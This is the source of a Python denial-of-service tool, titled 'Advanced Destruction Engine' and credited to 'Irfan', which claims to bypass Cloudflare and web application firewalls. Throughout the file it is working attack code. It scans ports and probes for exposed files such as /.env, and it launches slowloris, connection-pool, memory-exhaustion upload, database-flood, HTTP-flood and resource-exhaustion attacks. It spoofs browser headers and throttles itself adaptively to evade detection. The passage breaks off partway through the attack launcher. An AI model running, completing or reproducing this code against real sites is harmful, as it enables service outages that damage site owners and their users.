#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗██████╗ ███████╗ █████╗ ███╗   ██╗                    ║
║    ██║██╔══██╗██╔════╝██╔══██╗████╗  ██║                    ║
║    ██║██████╔╝█████╗  ███████║██╔██╗ ██║                    ║
║    ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║                    ║
║    ██║██║  ██║███████╗██║  ██║██║ ╚████║                    ║
║    ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝                    ║
║                                                              ║
║               ADVANCED DESTRUCTION ENGINE v7.0               ║
║           CLOUDFLARE & WAF BYPASS TECHNOLOGY                 ║
║                    AUTHOR: IRFAN                             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
import os
import sys
import time
import random
import threading
import socket
import asyncio
import aiohttp
import ssl
import urllib.parse
import json
import warnings
import urllib3
import struct
import ipaddress
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple

# Disable all warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# Rich imports
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.status import Status
from rich.syntax import Syntax
from rich import box
import colorama

# Initialize
colorama.init(autoreset=True)
console = Console()

# SSL context for ignoring certificate warnings
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# ==================== GLOBAL CONFIGURATION ====================
class Config:
    # Performance
    MAX_THREADS = 1000
    MAX_RPS = 5000
    CONNECTION_TIMEOUT = 30
    REQUEST_TIMEOUT = 30
    
    # Attack
    ATTACK_DURATION = 3600
    AUTO_RESTART = True
    STEALTH_MODE = False
    ATTACK_INTENSITY = "extreme"
    
    # Network
    USE_PROXY = False
    PROXY_LIST = []
    USE_TOR = False
    TOR_MAX_CIRCUITS = 50
    ROTATE_USER_AGENT = True
    ROTATE_IP = False
    
    # WAF Bypass
    ENABLE_WAF_BYPASS = True
    ADAPTIVE_ATTACK = True
    HUMAN_LIKE_DELAYS = True
    
    # Hybrid Attack Settings
    PERSISTENT_CONNECTIONS = 200
    SLOWLORIS_WORKERS = 100
    MEMORY_EXHAUSTION_SIZE = 10485760
    DATABASE_FLOOD_ENABLED = True
    CONNECTION_POOLING = True
    ENABLE_SLOWLORIS = True
    ENABLE_HTTP_FLOOD = True
    ENABLE_RESOURCE_EXHAUSTION = True
    ENABLE_DATABASE_FLOOD = True
    
    # Monitoring
    LOG_LEVEL = "INFO"
    SAVE_STATS = True
    
    @classmethod
    def update(cls, **kwargs):
        for key, value in kwargs.items():
            if hasattr(cls, key):
                setattr(cls, key, value)
                
    @classmethod
    def set_intensity(cls, intensity: str):
        intensity_levels = {
            "low": {
                "MAX_THREADS": 100,
                "MAX_RPS": 500,
                "PERSISTENT_CONNECTIONS": 50,
                "SLOWLORIS_WORKERS": 20,
                "MEMORY_EXHAUSTION_SIZE": 1048576,
                "HUMAN_LIKE_DELAYS": True
            },
            "medium": {
                "MAX_THREADS": 500,
                "MAX_RPS": 2000,
                "PERSISTENT_CONNECTIONS": 100,
                "SLOWLORIS_WORKERS": 50,
                "MEMORY_EXHAUSTION_SIZE": 5242880,
                "HUMAN_LIKE_DELAYS": False
            },
            "high": {
                "MAX_THREADS": 1000,
                "MAX_RPS": 5000,
                "PERSISTENT_CONNECTIONS": 200,
                "SLOWLORIS_WORKERS": 100,
                "MEMORY_EXHAUSTION_SIZE": 10485760,
                "HUMAN_LIKE_DELAYS": False
            },
            "extreme": {
                "MAX_THREADS": 2000,
                "MAX_RPS": 10000,
                "PERSISTENT_CONNECTIONS": 500,
                "SLOWLORIS_WORKERS": 200,
                "MEMORY_EXHAUSTION_SIZE": 20971520,
                "HUMAN_LIKE_DELAYS": False
            }
        }
        
        if intensity in intensity_levels:
            cls.ATTACK_INTENSITY = intensity
            for key, value in intensity_levels[intensity].items():
                setattr(cls, key, value)

# Global state
class AttackState:
    attacking = False
    start_time = 0
    stats = {
        'total_requests': 0,
        'successful': 0,
        'blocked': 0,
        'errors': 0,
        'bytes_sent': 0,
        'bytes_received': 0,
        'peak_rps': 0,
        'current_rps': 0,
        'targets_hit': 0,
        'unique_ips': set(),
        'waf_detected': False,
        'cloudflare_detected': False,
        'persistent_connections': 0,
        'slowloris_connections': 0,
        'memory_exhaustion_attempts': 0,
        'database_floods': 0,
        'connection_pool_size': 0
    }
    lock = threading.Lock()
    last_count = 0
    attack_wave = 1

# ==================== USER AGENTS & HEADERS ====================
BROWSER_SIGNATURES = [
    {
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        }
    },
    {
        'user_agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1'
        }
    },
    {
        'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0'
        }
    },
    {
        'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
    },
    {
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Microsoft Edge";v="120", "Chromium";v="120", "Not?A_Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
    }
]

REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.reddit.com/',
    'https://www.linkedin.com/',
    'https://github.com/',
    'https://stackoverflow.com/',
    'https://www.youtube.com/',
    'https://www.amazon.com/',
    'https://www.wikipedia.org/'
]

# ==================== TARGET INFORMATION ====================
class TargetInfo:
    def __init__(self, url):
        self.url = url
        self.protocol = "http"
        self.host = ""
        self.port = 80
        self.path = "/"
        self.ip = ""
        self.ssl_enabled = False
        self.server_info = {}
        self.technologies = []
        self.vulnerabilities = []
        self.protection_detected = False
        self.protection_type = None
        self.server_header = ""
        self.open_ports = []
        self.server_load = "unknown"
        
    def parse(self):
        try:
            if not self.url.startswith(('http://', 'https://')):
                self.url = 'http://' + self.url
            parsed = urllib.parse.urlparse(self.url)
            self.protocol = parsed.scheme
            self.host = parsed.hostname
            self.port = parsed.port or (443 if self.protocol == 'https' else 80)
            self.path = parsed.path or '/'
            self.ssl_enabled = (self.protocol == 'https')
            
            try:
                self.ip = socket.gethostbyname(self.host)
                AttackState.stats['unique_ips'].add(self.ip)
            except:
                self.ip = self.host
                
            self._scan_ports()
            
            return True
        except Exception as e:
            console.print(f"[red]✗ Error parsing target: {e}[/]")
            return False
    
    def _scan_ports(self):
        common_ports = [80, 443, 8080, 8443, 3000, 8000, 8888, 9000]
        self.open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.ip, port))
                if result == 0:
                    self.open_ports.append(port)
                sock.close()
            except:
                continue
    
    def scan_and_detect(self):
        try:
            import requests
            browser = random.choice(BROWSER_SIGNATURES)
            headers = browser['headers'].copy()
            headers['User-Agent'] = browser['user_agent']
            
            response = requests.get(self.url, headers=headers, timeout=10, verify=False)
            self.server_info = dict(response.headers)
            self.server_header = response.headers.get('Server', 'Unknown')
            
            self._detect_technologies(response)
            self._detect_protections(response)
            self._find_vulnerabilities()
            self._estimate_server_load(response)
            
            return True
        except Exception as e:
            console.print(f"[yellow]⚠️  Scan failed: {e}[/]")
            return False
    
    def _detect_technologies(self, response):
        tech_indicators = {
            'WordPress': ['/wp-content/', '/wp-admin/', 'wp-json', 'wordpress'],
            'Joomla': ['/media/jui/', '/administrator/', 'joomla'],
            'Drupal': ['/sites/default/', 'Drupal'],
            'Laravel': ['/storage/', 'laravel_session'],
            'Nginx': ['Server: nginx'],
            'Apache': ['Server: Apache'],
            'CloudFlare': ['cf-ray', 'cloudflare', '__cfduid', '__cf_bm'],
            'AWS': ['x-amz-cf-id', 'x-amz-cf-pop'],
            'PHP': ['PHP/', 'X-Powered-By: PHP'],
            'Node.js': ['X-Powered-By: Express'],
            'React': ['react', 'next.js'],
            'Vue.js': ['vue', 'nuxt.js'],
            'IIS': ['Microsoft-IIS'],
            'Tomcat': ['Apache-Coyote', 'Tomcat']
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        for tech, indicators in tech_indicators.items():
            for indicator in indicators:
                if indicator.lower() in content or indicator.lower() in headers:
                    if tech not in self.technologies:
                        self.technologies.append(tech)
                    break
    
    def _detect_protections(self, response):
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        cloudflare_indicators = [
            'cloudflare',
            '__cfduid',
            '__cf_bm',
            'cf-ray',
            'checking your browser',
            'please wait',
            'ddos protection',
            'cf-cache-status'
        ]
        
        for indicator in cloudflare_indicators:
            if indicator in headers or indicator in content:
                self.protection_detected = True
                self.protection_type = 'cloudflare'
                AttackState.stats['cloudflare_detected'] = True
                break
        
        waf_indicators = [
            '403 forbidden',
            'access denied',
            'your request has been blocked',
            'security violation',
            'waf',
            'imperva',
            'akamai',
            'sucuri',
            'incapsula',
            'barracuda',
            'fortinet'
        ]
        
        if not self.protection_detected:
            for indicator in waf_indicators:
                if indicator in content:
                    self.protection_detected = True
                    self.protection_type = 'waf'
                    AttackState.stats['waf_detected'] = True
                    break
        
        captcha_indicators = [
            'captcha',
            'recaptcha',
            'hcaptcha',
            'verify you are human',
            'are you a human',
            'robot check'
        ]
        
        if not self.protection_detected:
            for indicator in captcha_indicators:
                if indicator in content:
                    self.protection_detected = True
                    self.protection_type = 'captcha'
                    break
    
    def _find_vulnerabilities(self):
        import requests
        vuln_endpoints = [
            '/xmlrpc.php',
            '/wp-json/wp/v2/users',
            '/.env',
            '/phpinfo.php',
            '/server-status',
            '/admin/config.php',
            '/debug',
            '/test',
            '/backup',
            '/database.sql',
            '/wp-admin/install.php',
            '/administrator/index.php',
            '/cgi-bin/test.cgi',
            '/api/v1/users',
            '/graphql',
            '/phpmyadmin',
            '/adminer.php',
            '/mysql/admin',
            '/dbadmin',
            '/pma'
        ]
        
        for endpoint in vuln_endpoints:
            try:
                test_url = f"{self.url.rstrip('/')}{endpoint}"
                browser = random.choice(BROWSER_SIGNATURES)
                headers = browser['headers'].copy()
                headers['User-Agent'] = browser['user_agent']
                resp = requests.get(test_url, headers=headers, timeout=3, verify=False)
                if resp.status_code in [200, 403, 500]:
                    self.vulnerabilities.append(endpoint)
            except:
                continue
    
    def _estimate_server_load(self, response):
        try:
            import requests
            import time as t
            
            start_time = t.time()
            test_response = requests.get(self.url, timeout=5, verify=False)
            end_time = t.time()
            
            response_time = (end_time - start_time) * 1000
            
            if response_time < 100:
                self.server_load = "low"
            elif response_time < 500:
                self.server_load = "medium"
            elif response_time < 1000:
                self.server_load = "high"
            else:
                self.server_load = "very high"
                
        except:
            self.server_load = "unknown"

# ==================== PERSISTENT CONNECTION POOL ====================
class PersistentConnectionPool:
    
    def __init__(self, target: TargetInfo, pool_size: int = 100):
        self.target = target
        self.pool_size = pool_size
        self.connections: List[socket.socket] = []
        self.active_connections = 0
        self.lock = threading.Lock()
        self.running = False
        self.keep_alive_thread = None
        
    def create_connections(self):
        console.print(f"[cyan]🔗 Creating {self.pool_size} persistent connections...[/]")
        
        for i in range(self.pool_size):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                
                sock.connect((self.target.ip, self.target.port))
                
                request = f"GET / HTTP/1.1\r\n"
                request += f"Host: {self.target.host}\r\n"
                request += f"User-Agent: {random.choice(BROWSER_SIGNATURES)['user_agent']}\r\n"
                request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += f"Accept-Language: en-US,en;q=0.9\r\n"
                
                sock.send(request.encode())
                
                with self.lock:
                    self.connections.append(sock)
                    self.active_connections += 1
                    AttackState.stats['persistent_connections'] += 1
                    
                if i % 50 == 0:
                    console.print(f"[green]✓ Created {i+1}/{self.pool_size} connections[/]")
                    
            except Exception as e:
                console.print(f"[yellow]⚠️  Failed to create connection {i}: {e}[/]")
                continue
        
        console.print(f"[green]✅ Created {self.active_connections} persistent connections[/]")
        return self.active_connections
    
    def send_keep_alive(self):
        while self.running and AttackState.attacking:
            try:
                with self.lock:
                    active_conns = self.connections.copy()
                
                for sock in active_conns:
                    try:
                        sock.send(b"X-a: b\r\n")
                        time.sleep(0.01)
                    except:
                        with self.lock:
                            if sock in self.connections:
                                self.connections.remove(sock)
                                self.active_connections -= 1
                                AttackState.stats['persistent_connections'] -= 1
                        try:
                            sock.close()
                        except:
                            pass
                
                if self.active_connections < self.pool_size * 0.8:
                    self._replenish_connections()
                
                AttackState.stats['connection_pool_size'] = self.active_connections
                
                time.sleep(random.uniform(15, 30))
                
            except Exception as e:
                console.print(f"[red]✗ Keep-alive error: {e}[/]")
                time.sleep(5)
    
    def _replenish_connections(self):
        needed = self.pool_size - self.active_connections
        if needed > 0:
            console.print(f"[yellow]🔄 Replenishing {needed} broken connections...[/]")
            for i in range(needed):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(30)
                    sock.connect((self.target.ip, self.target.port))
                    
                    request = f"GET / HTTP/1.1\r\n"
                    request += f"Host: {self.target.host}\r\n"
                    request += f"User-Agent: {random.choice(BROWSER_SIGNATURES)['user_agent']}\r\n"
                    request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    
                    sock.send(request.encode())
                    
                    with self.lock:
                        self.connections.append(sock)
                        self.active_connections += 1
                        AttackState.stats['persistent_connections'] += 1
                        
                except:
                    continue
    
    def start(self):
        self.running = True
        self.keep_alive_thread = threading.Thread(target=self.send_keep_alive, daemon=True)
        self.keep_alive_thread.start()
        console.print("[green]✅ Persistent connection pool started[/]")
    
    def stop(self):
        self.running = False
        
        if self.keep_alive_thread:
            self.keep_alive_thread.join(timeout=5)
        
        with self.lock:
            for sock in self.connections:
                try:
                    sock.close()
                except:
                    pass
            self.connections.clear()
            self.active_connections = 0
            AttackState.stats['persistent_connections'] = 0
        
        console.print("[yellow]🛑 Persistent connection pool stopped[/]")

# ==================== ADVANCED ATTACK VECTORS ====================
class AdvancedAttackVectors:
    
    @staticmethod
    async def slowloris_attack(target: TargetInfo, worker_id: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(Config.CONNECTION_TIMEOUT)
            
            sock.connect((target.ip, target.port))
            
            request_lines = [
                f"GET /{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))} HTTP/1.1\r\n",
                f"Host: {target.host}\r\n",
                f"User-Agent: {random.choice(BROWSER_SIGNATURES)['user_agent']}\r\n",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                f"Accept-Language: en-US,en;q=0.9\r\n",
                f"Accept-Encoding: gzip, deflate\r\n",
                f"Connection: keep-alive\r\n",
                f"Keep-Alive: timeout=900\r\n"
            ]
            
            for i, line in enumerate(request_lines):
                sock.send(line.encode())
                
                if i < len(request_lines) - 1:
                    delay = random.uniform(5, 15)
                    await asyncio.sleep(delay)
            
            start_time = time.time()
            while (time.time() - start_time) < 600 and AttackState.attacking:
                try:
                    random_headers = [
                        f"X-{random.choice(['Custom', 'Request', 'Header', 'Token'])}: {random.randint(1000, 9999)}\r\n",
                        f"Cache-Control: {random.choice(['no-cache', 'max-age=0', 'no-store'])}\r\n",
                        f"Pragma: {random.choice(['no-cache', ''])}\r\n"
                    ]
                    
                    for header in random_headers:
                        sock.send(header.encode())
                        await asyncio.sleep(random.uniform(10, 30))
                        
                except Exception as e:
                    break
            
            try:
                sock.close()
            except:
                pass
            
            with AttackState.lock:
                AttackState.stats['slowloris_connections'] += 1
                AttackState.stats['successful'] += 1
            
            return 'success'
            
        except Exception as e:
            with AttackState.lock:
                AttackState.stats['errors'] += 1
            return 'error'
    
    @staticmethod
    async def memory_exhaustion_attack(target: TargetInfo, session: aiohttp.ClientSession):
        try:
            payload_size = random.randint(
                Config.MEMORY_EXHAUSTION_SIZE // 2,
                Config.MEMORY_EXHAUSTION_SIZE
            )
            
            large_payload = os.urandom(payload_size)
            
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
            
            body_start = f"--{boundary}\r\n"
            body_start += 'Content-Disposition: form-data; name="file"; filename="large_file.bin"\r\n'
            body_start += 'Content-Type: application/octet-stream\r\n\r\n'
            
            body_end = f"\r\n--{boundary}--\r\n"
            
            full_body = body_start.encode() + large_payload + body_end.encode()
            
            headers = {
                'User-Agent': random.choice(BROWSER_SIGNATURES)['user_agent'],
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'Content-Length': str(len(full_body)),
                'Connection': 'keep-alive',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            upload_urls = [
                f"{target.protocol}://{target.host}:{target.port}/upload",
                f"{target.protocol}://{target.host}:{target.port}/api/upload",
                f"{target.protocol}://{target.host}:{target.port}/admin/upload",
                f"{target.protocol}://{target.host}:{target.port}/wp-admin/async-upload.php"
            ]
            
            url = random.choice(upload_urls)
            
            async with session.post(
                url,
                data=full_body,
                headers=headers,
                ssl=ssl_context,
                timeout=aiohttp.ClientTimeout(total=60)
            ) as response:
                
                try:
                    await response.read()
                except:
                    pass
                
                with AttackState.lock:
                    AttackState.stats['memory_exhaustion_attempts'] += 1
                    AttackState.stats['bytes_sent'] += len(full_body)
                    AttackState.stats['successful'] += 1
                
                return 'success'
                
        except asyncio.TimeoutError:
            with AttackState.lock:
                AttackState.stats['memory_exhaustion_attempts'] += 1
                AttackState.stats['successful'] += 1
            return 'success'
        except Exception as e:
            with AttackState.lock:
                AttackState.stats['errors'] += 1
            return 'error'
    
    @staticmethod
    async def database_flood_attack(target: TargetInfo, session: aiohttp.ClientSession):
        try:
            db_endpoints = [
                '/search?q=' + 'a' * random.randint(500, 2000),
                '/api/products?limit=' + str(random.randint(100, 1000)) + '&offset=' + str(random.randint(0, 10000)),
                '/wp-json/wp/v2/posts?per_page=' + str(random.randint(50, 200)),
                '/api/users?fields=' + ','.join(['*'] * random.randint(20, 100)),
                '/api/orders?status=' + random.choice(['pending', 'processing', 'completed', 'cancelled'])
            ]
            
            endpoint = random.choice(db_endpoints)
            url = f"{target.protocol}://{target.host}:{target.port}{endpoint}"
            
            headers = random.choice(BROWSER_SIGNATURES)['headers'].copy()
            headers['User-Agent'] = random.choice(BROWSER_SIGNATURES)['user_agent']
            
            if 'graphql' in endpoint:
                headers['Content-Type'] = 'application/json'
                query = {
                    "query": """
                    query {
                      users {
                        id
                        name
                        email
                        posts {
                          id
                          title
                          comments {
                            id
                            content
                            author {
                              id
                              name
                            }
                          }
                        }
                        friends {
                          id
                          name
                          posts {
                            id
                            title
                          }
                        }
                      }
                    }
                    """
                }
                
                async with session.post(url, json=query, headers=headers,
                                      ssl=ssl_context,
                                      timeout=aiohttp.ClientTimeout(total=30)) as response:
                    await response.read()
            else:
                async with session.get(url, headers=headers,
                                     ssl=ssl_context,
                                     timeout=aiohttp.ClientTimeout(total=20)) as response:
                    await response.read()
            
            with AttackState.lock:
                AttackState.stats['database_floods'] += 1
                AttackState.stats['successful'] += 1
            
            return 'success'
            
        except asyncio.TimeoutError:
            with AttackState.lock:
                AttackState.stats['database_floods'] += 1
                AttackState.stats['successful'] += 1
            return 'success'
        except Exception as e:
            with AttackState.lock:
                AttackState.stats['errors'] += 1
            return 'error'
    
    @staticmethod
    async def http_flood_attack(target: TargetInfo, session: aiohttp.ClientSession):
        try:
            paths = [
                '/', '/index.html', '/home', '/main', '/default.aspx',
                '/about', '/contact', '/products', '/services', '/blog',
                '/news', '/articles', '/faq', '/help', '/support',
                '/login', '/register', '/account', '/profile', '/dashboard'
            ]
            
            path = random.choice(paths)
            
            params = []
            if random.random() > 0.4:
                params.append(f"utm_source={random.choice(['google', 'facebook', 'twitter', 'direct'])}")
            if random.random() > 0.6:
                params.append(f"utm_medium={random.choice(['organic', 'cpc', 'social', 'email'])}")
            if random.random() > 0.7:
                params.append(f"ref={random.choice(['homepage', 'internal', 'external'])}")
            if random.random() > 0.5:
                params.append(f"_={random.randint(1000000000, 9999999999)}")
            
            param_str = "?" + "&".join(params) if params else ""
            
            if target.port in [80, 443]:
                url = f"{target.protocol}://{target.host}{path}{param_str}"
            else:
                url = f"{target.protocol}://{target.host}:{target.port}{path}{param_str}"
            
            browser = random.choice(BROWSER_SIGNATURES)
            headers = browser['headers'].copy()
            headers['User-Agent'] = browser['user_agent']
            
            if random.random() > 0.3:
                headers['Referer'] = random.choice(REFERERS)
            
            if random.random() > 0.5:
                headers['Cookie'] = f"session_id={random.randint(10000, 99999)}; visited=true"
            
            methods = ['GET', 'HEAD', 'POST']
            method_weights = [0.7, 0.1, 0.2]
            method = random.choices(methods, weights=method_weights)[0]
            
            if method == 'GET':
                async with session.get(url, headers=headers, ssl=ssl_context,
                                     timeout=aiohttp.ClientTimeout(total=15)) as response:
                    await response.read()
            elif method == 'POST':
                post_data = {
                    'search': random.choice(['', 'test', 'query', 'product']),
                    'email': f"user{random.randint(1, 1000)}@example.com",
                    'name': random.choice(['John', 'Jane', 'Mike', 'Sarah']),
                    'message': random.choice(['', 'Hello', 'Test message', 'Inquiry'])
                }
                async with session.post(url, data=post_data, headers=headers, ssl=ssl_context,
                                      timeout=aiohttp.ClientTimeout(total=15)) as response:
                    await response.read()
            else:
                async with session.head(url, headers=headers, ssl=ssl_context,
                                      timeout=aiohttp.ClientTimeout(total=10)) as response:
                    await response.read()
            
            with AttackState.lock:
                AttackState.stats['total_requests'] += 1
                AttackState.stats['successful'] += 1
            
            return 'success'
            
        except asyncio.TimeoutError:
            with AttackState.lock:
                AttackState.stats['total_requests'] += 1
                AttackState.stats['errors'] += 1
            return 'timeout'
        except Exception as e:
            with AttackState.lock:
                AttackState.stats['total_requests'] += 1
                AttackState.stats['errors'] += 1
            return 'error'
    
    @staticmethod
    async def resource_exhaustion_attack(target: TargetInfo, session: aiohttp.ClientSession):
        try:
            resource_paths = [
                '/large-image.jpg',
                '/big-file.pdf',
                '/video.mp4',
                '/archive.zip',
                '/database-backup.sql',
                '/log-file.log'
            ]
            
            path = random.choice(resource_paths)
            url = f"{target.protocol}://{target.host}:{target.port}{path}"
            
            headers = random.choice(BROWSER_SIGNATURES)['headers'].copy()
            headers['User-Agent'] = random.choice(BROWSER_SIGNATURES)['user_agent']
            
            if random.random() > 0.5:
                headers['Range'] = f'bytes={random.randint(0, 1000000)}-{random.randint(1000000, 5000000)}'
            
            async with session.get(url, headers=headers, ssl=ssl_context,
                                 timeout=aiohttp.ClientTimeout(total=20)) as response:
                total_read = 0
                async for chunk in response.content.iter_chunked(8192):
                    total_read += len(chunk)
                    if total_read > 1048576:
                        break
            
            with AttackState.lock:
                AttackState.stats['successful'] += 1
            
            return 'success'
            
        except Exception as e:
            with AttackState.lock:
                AttackState.stats['errors'] += 1
            return 'error'

# ==================== SMART ATTACK MANAGER ====================
class SmartAttackManager:
    
    def __init__(self, target):
        self.target = target
        self.session = None
        self.attack_methods = [
            AdvancedAttackVectors.http_flood_attack,
            AdvancedAttackVectors.slowloris_attack,
            AdvancedAttackVectors.memory_exhaustion_attack,
            AdvancedAttackVectors.database_flood_attack,
            AdvancedAttackVectors.resource_exhaustion_attack
        ]
        self.method_weights = [0.3, 0.2, 0.2, 0.15, 0.15]
        self.blocked_counter = {
            'cloudflare': 0,
            'captcha': 0,
            'waf': 0,
            'rate_limit': 0,
            'total': 0
        }
        self.success_counter = 0
        self.adaptive_mode = 'normal'
    
    async def init_session(self):
        timeout = aiohttp.ClientTimeout(
            total=Config.REQUEST_TIMEOUT,
            connect=8,
            sock_read=12,
            sock_connect=8
        )
        connector = aiohttp.TCPConnector(
            limit=0,
            ssl=ssl_context,
            force_close=True,
            enable_cleanup_closed=True,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        cookie_jar = aiohttp.CookieJar()
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookie_jar=cookie_jar
        )
    
    def _update_adaptive_mode(self):
        total_attempts = self.blocked_counter['total'] + self.success_counter
        if total_attempts == 0:
            return
        success_rate = (self.success_counter / total_attempts) * 100
        if success_rate < 20:
            self.adaptive_mode = 'stealth'
            console.print("[yellow]🔄 Switching to STEALTH mode (low success rate)[/]")
        elif success_rate > 70:
            self.adaptive_mode = 'aggressive'
            console.print("[green]⚡ Switching to AGGRESSIVE mode (high success rate)[/]")
        else:
            self.adaptive_mode = 'normal'
    
    def _get_attack_delay(self):
        base_delay = 1.0 / Config.MAX_RPS
        if self.adaptive_mode == 'stealth':
            return base_delay * random.uniform(2.0, 5.0)
        elif self.adaptive_mode == 'aggressive':
            return base_delay * random.uniform(0.5, 1.5)
        else:
            return base_delay * random.uniform(0.8, 2.0)
    
    async def smart_worker(self, worker_id):
        while AttackState.attacking:
            try:
                if worker_id == 0 and AttackState.stats['total_requests'] % 100 == 0:
                    self._update_adaptive_mode()
                
                attack_method = random.choices(
                    self.attack_methods,
                    weights=self.method_weights,
                    k=1
                )[0]
                
                if attack_method == AdvancedAttackVectors.slowloris_attack:
                    result = await attack_method(self.target, worker_id)
                else:
                    result = await attack_method(self.target, self.session)
                
                with AttackState.lock:
                    AttackState.stats['total_requests'] += 1
                    if result == 'success':
                        AttackState.stats['successful'] += 1
                        self.success_counter += 1
                        self.blocked_counter['total'] = max(0, self.blocked_counter['total'] - 1)
                    elif result.startswith('blocked_'):
                        block_type = result.split('_')[1]
                        AttackState.stats['blocked'] += 1
                        self.blocked_counter[block_type] += 1
                        self.blocked_counter['total'] += 1
                        if block_type in ['cloudflare', 'captcha']:
                            self.method_weights[0] = max(0.1, self.method_weights[0] - 0.05)
                            self.method_weights[1] = min(0.4, self.method_weights[1] + 0.03)
                            self.method_weights[2] = min(0.4, self.method_weights[2] + 0.02)
                    else:
                        AttackState.stats['errors'] += 1
                
                delay = self._get_attack_delay()
                await asyncio.sleep(delay)
                
            except Exception as e:
                with AttackState.lock:
                    AttackState.stats['errors'] += 1
    
    async def start_smart_attack(self, num_workers):
        await self.init_session()
        
        console.print("[yellow]🔍 Performing initial reconnaissance...[/]")
        await asyncio.sleep(2)
        
        tasks = []
        worker_count = min(num_workers, Config.MAX_THREADS)
        
        slowloris_workers = min(Config.SLOWLORIS_WORKERS, worker_count // 4)
        http_workers = worker_count - slowloris_workers
        
        console.print(f"[cyan]📊 Worker distribution: {http_workers} HTTP workers, {slowloris_workers} Slowloris workers[/]")
        
        for i in range(http_workers):
            task = asyncio.create_task(self.smart_worker(i))
            tasks.append(task)
        
        for i in range(slowloris_workers):
            task = asyncio.create_task(AdvancedAttackVectors.slowloris_attack(self.target, i))
            tasks.append(task)
        
        try:
            start_time = time.time()
